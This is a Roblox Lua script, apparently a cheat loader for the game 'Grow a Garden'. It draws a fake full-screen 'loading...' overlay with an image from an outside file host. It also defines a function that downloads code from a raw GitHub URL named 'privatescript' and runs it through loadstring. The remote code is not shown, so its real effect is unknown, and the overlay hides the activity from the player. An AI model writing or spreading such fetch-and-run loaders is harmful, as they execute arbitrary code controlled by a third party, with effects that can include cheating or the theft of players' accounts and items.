local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
loadingFrame.BackgroundTransparency = 0.5
loadingFrame.Parent = screenGui

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.5, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.25, 0, 0.45, 0)
loadingText.Text = "loading..."
loadingText.TextSize = 30
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.BackgroundTransparency = 1
loadingText.Parent = loadingFrame

local loadingImage = Instance.new("ImageLabel")
loadingImage.Size = UDim2.new(0.2, 0, 0.2, 0)
loadingImage.Position = UDim2.new(0.4, 0, 0.3, 0)
loadingImage.Image = "https://d.kuku.lu/5mrwebmdr"
loadingImage.BackgroundTransparency = 1
loadingImage.Parent = loadingFrame

local function loadScript()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/privatescript"))()
end